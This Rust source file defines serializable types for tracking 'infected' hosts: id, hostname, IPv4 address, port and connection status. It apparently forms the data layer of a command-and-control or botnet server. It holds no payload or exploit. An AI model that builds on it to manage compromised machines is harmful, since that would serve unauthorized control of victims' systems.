use std::{default, net::{AddrParseError, Ipv4Addr}, ops::Add, str::FromStr};
use serde::{de::value::Error, Deserialize, Serialize};
use uuid::serde::braced::serialize;
use ::uuid::Uuid;
use ::thiserror::Error;

use crate::repos::database::{InfectedDatabaseError, InfectedRepo};

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct Infected {
    id: InfectedId,
    hostname: HostName,
    ip: InfectedIpAddr,
    port: u16
}

impl Infected {
    pub fn new(hostname: &str, ip: &str) -> Self {
        Self { id: InfectedId::new(), hostname: HostName::new(hostname), ip: InfectedIpAddr::from_str(ip).expect("Could not parse IP"), port: 8000 }
    }

    pub fn hostname(&self) -> String {
        self.hostname.0.clone()
    }

    pub fn id(&self) -> Uuid {
        self.id.0
    }

    pub fn ip(&self) -> String {
        self.ip.0.to_string()
    }

    pub fn port(&self) -> String {
        self.port.to_string()
    }
}

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct HostName(String);

impl HostName {
    pub fn new(hostname: &str) -> Self {
        Self(hostname.to_string())
    }
}

impl From<String> for HostName {
    fn from(value: String) -> Self {
        HostName(value)
    }
}


#[derive(Deserialize, Serialize, Debug, Clone, Copy)]
pub struct InfectedId(Uuid);

impl InfectedId {
    pub fn new() -> Self {
        Self(Uuid::new_v4())
    }

    pub fn get(&self) -> Uuid {
        self.0
    }
}

#[derive(Debug, Deserialize, Clone)]
#[serde(try_from = "String")]
pub struct InfectedIpAddr(Ipv4Addr);

impl InfectedIpAddr {
    pub fn from_str(s: &str) -> Result<Self, AddrParseError> {
        let address = InfectedIpAddr::try_from(s.to_string());
        address
    }
}

impl From<InfectedIpAddr> for Ipv4Addr {
    fn from(infected_ip: InfectedIpAddr) -> Self {
        infected_ip.0
    }
}

impl TryFrom<String> for InfectedIpAddr {
    type Error = AddrParseError;
    fn try_from(value: String) -> Result<Self, Self::Error> {
        let ipv4addr = InfectedIpAddr(Ipv4Addr::from_str(&value)?);
        Ok(ipv4addr)
    }
}

impl Serialize for InfectedIpAddr {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
        where
            S: serde::Serializer {
        let str = &self.0.to_string();
        serializer.serialize_str(str)
    }
}

#[derive(Deserialize, Serialize, Debug, Default, Clone)]
pub enum InfectedConnectionStatus {
    Connected,
    #[default]
    Disconnected,
    Awaiting,
}